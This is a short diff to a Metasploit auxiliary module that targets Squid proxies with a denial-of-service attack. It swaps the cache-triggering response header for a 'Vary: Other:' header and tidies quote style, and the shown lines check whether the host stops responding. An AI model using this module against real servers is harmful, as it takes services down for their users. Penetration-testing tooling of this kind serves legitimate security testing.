@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def on_request_uri(cli, _request)
     # The Last-Modified response header must be set such that Squid caches the page.
-    send_response(cli, '<html></html>', { 'Last-Modified' => 'Mon, 01 Jan 2020 00:00:00 GMT' })
+    send_response(cli, '<html></html>', { 'Vary' => 'Other:' })
   end
 
   def run
@@ -86,14 +86,14 @@ class MetasploitModule < Msf::Auxiliary
 
         next # Host could be completely dead, or just waiting for another Squid child.
       elsif count == 0
-        print_error("Cannot connect to host.")
+        print_error('Cannot connect to host.')
         return
       end
 
       error_count += 1
       next unless error_count > reqs # If we cannot connect after `res` amount of attempts, assume the DoS was successful.
 
-      print_good("DoS completely successful.")
+      print_good('DoS completely successful.')
       report_vuln(
         host: rhost,
         port: rport,
@@ -102,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
       )
       return
     end
-      print_error("Looks like the host is not vulnerable.")
+    print_error('Looks like the host is not vulnerable.')
   end
 
   def req(cve)
